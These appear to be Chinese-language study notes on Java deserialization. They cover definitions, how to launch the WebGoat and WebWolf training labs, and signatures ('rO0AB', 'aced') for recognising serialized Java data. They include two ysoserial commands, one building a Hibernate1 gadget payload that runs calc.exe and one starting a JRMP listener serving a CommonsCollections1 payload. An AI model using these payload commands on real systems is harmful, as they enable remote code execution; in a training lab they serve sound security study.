![5EE2y8.png](https://z3.ax1x.com/2021/10/10/5EE2y8.png)

![5EEfeg.png](https://z3.ax1x.com/2021/10/10/5EEfeg.png)

序列化 (Serialization)：将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对

象将其当前状态写入到临时或持久性存储区

反序列化：从存储区中读取该数据，并将其还原为对象的过程，称为反序列化

#### webgoat

网址启动：

`java --add-opens java.base/sun.nio.ch=ALL-UNNAMED --add-opens java.base/java.io=ALL-UNNAMED -Dfile.encoding=UTF-8 -jar webgoat-server-8.2.2.jar [--server.port=8080][--server.address=localhost] [--hsqldb.port=9001]`

后台启动：

`java -Dfile.encoding=UTF-8 -jar webwolf-8.2.2.jar [--server.port=9090][--server.address=localhost] [--hsqldb.port=9001]`

网址：`http://127.0.0.1:8080/WebGoat`

后台：`http://127.0.0.1:9090/WebWolf`

#### JAVAWEB 特征可以作为序列化的标志参考

一段数据以 rO0AB 开头，你基本可以确定这串就是 JAVA 序列化 base64 加密的数据。

或者如果以 aced 开头，那么他就是这一段 java 序列化的 16 进制。

java -Dhibernate5 -cp hibernate-core-5.4.9.Final.jar;ysoserial-master-30099844c6-1.jar ysoserial.GeneratePayload Hibernate1 calc.exe > payload.bin



java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener  41 CommonsCollections1 'ipconfig'

![](https://s4.ax1x.com/2021/12/18/TVPtUI.png)
